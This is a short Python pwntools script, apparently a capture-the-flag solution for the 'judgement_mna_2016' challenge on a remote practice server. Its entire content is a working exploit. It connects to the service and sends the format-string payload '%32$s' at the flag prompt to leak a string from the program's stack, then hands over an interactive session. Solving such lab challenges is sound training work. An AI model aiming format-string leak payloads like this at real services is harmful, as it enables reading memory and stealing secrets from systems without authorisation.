from pwn import *

#p = process('./judgement_mna_2016')
p = remote('node4.buuoj.cn', 28751)

p.sendlineafter(b'flag >> ', b'%32$s')

p.interactive()